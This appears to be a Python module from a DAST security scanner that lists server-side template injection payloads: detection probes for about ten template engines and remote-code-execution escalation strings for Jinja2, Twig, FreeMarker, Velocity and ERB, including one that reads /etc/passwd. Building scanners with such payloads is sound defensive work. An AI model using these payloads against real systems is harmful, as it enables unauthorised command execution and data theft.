"""
DevSecure360 — DAST SSTI Payloads (Enterprise Edition)
========================================================
Server-Side Template Injection: engine-specific detection and RCE escalation.
Uses unique math canaries that produce unambiguous outputs to eliminate false positives.
Sources: PortSwigger SSTI research, PayloadsAllTheThings SSTI corpus, James Kettle's work.
"""
import uuid


def get_detection_payloads() -> list:
    """
    Engine-specific math-expression payloads with unique expected outputs.
    Uses UUIDs embedded in expressions to avoid false positives.
    Returns list of (payload, expected_substring) tuples.
    """
    # Use a static canary value for detection — unique enough to avoid false positives
    canary = "ds360xss"
    return [
        # ── Jinja2 / Django ───────────────────────────────────────────────────
        # {{7*'7'}} → '7777777' (ONLY in Jinja2, not Twig which returns 49)
        ("{{7*'7'}}", "7777777"),
        # Standard math — less unique but broad coverage
        ("{{49*49}}", "2401"),
        # Class access chain (confirms Jinja2 specifically)
        ("{{config.__class__}}", "Config"),
        # String manipulation
        (f"{{{{'{'}}}{canary}{{{{'}'}}}", canary),  # literal braces test

        # ── Twig (PHP) ─────────────────────────────────────────────────────────
        # {{7*'7'}} → 49 in Twig (different from Jinja2!)
        ("{{7*7}}", "49"),
        # Twig-specific
        ("{{_self}}", "Twig"),
        ("{{dump(1)}}", "int(1)"),

        # ── FreeMarker (Java) ──────────────────────────────────────────────────
        ("${7*7}", "49"),
        ("<#assign x=7*7>${x}", "49"),
        ("<#attempt><#recover></#attempt>", ""),     # FreeMarker error recovery

        # ── Velocity (Java) ────────────────────────────────────────────────────
        ("#set($x=7*7)${x}", "49"),
        ("#set($x='ds360')$x", "ds360"),

        # ── Smarty (PHP) ───────────────────────────────────────────────────────
        ("{math equation='x * x' x=7}", "49"),
        ("{$smarty.version}", "Smarty"),

        # ── Mako (Python) ──────────────────────────────────────────────────────
        ("${7*7}", "49"),
        ("<%\n    import os\n%>", ""),

        # ── ERB (Ruby) ─────────────────────────────────────────────────────────
        ("<%= 7*7 %>", "49"),
        ("<%= 'ds360'.upcase %>", "DS360"),

        # ── Handlebars (Node.js) ───────────────────────────────────────────────
        ("{{#each this}}{{this}}{{/each}}", ""),
        ("{{lookup . 'constructor'}}", "function"),

        # ── Pebble (Java) ──────────────────────────────────────────────────────
        ("{{7*7}}", "49"),

        # ── Tornado (Python) ──────────────────────────────────────────────────
        ("{% raw %}{{7*7}}{% end %}", "{{7*7}}"),   # If rendered, no SSTI. If evaluated, SSTI.

        # ── Generic expression injection ──────────────────────────────────────
        ("${49}", "49"),
        ("#{49}", "49"),
        ("*{49}", "49"),
        ("@{49}", "49"),
    ]


def get_rce_payloads() -> list:
    """
    RCE escalation payloads for confirmed Jinja2/Twig SSTI.
    These attempt to call system commands through the template engine.
    """
    return [
        # Jinja2 RCE via MRO chain — reads /etc/passwd
        "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
        # Jinja2 — config-based globals access
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        # Jinja2 — request object (Flask)
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        # Jinja2 — cycler
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # Jinja2 — joiner
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",

        # Twig RCE
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{[0]|reduce('system','id')}}",

        # FreeMarker RCE
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',

        # Velocity RCE
        "#set($e='')\n#set($class=$e.getClass())\n#set($forName=$class.forName('java.lang.Runtime'))\n#set($method=$forName.getMethod('exec',[$class.forName('java.lang.String')]))\n#set($instance=$forName.getMethod('getRuntime',null).invoke(null,null))\n#set($output=$method.invoke($instance,'id'))\n$output",

        # ERB RCE
        "<%= `id` %>",
        "<%= system('id') %>",
    ]
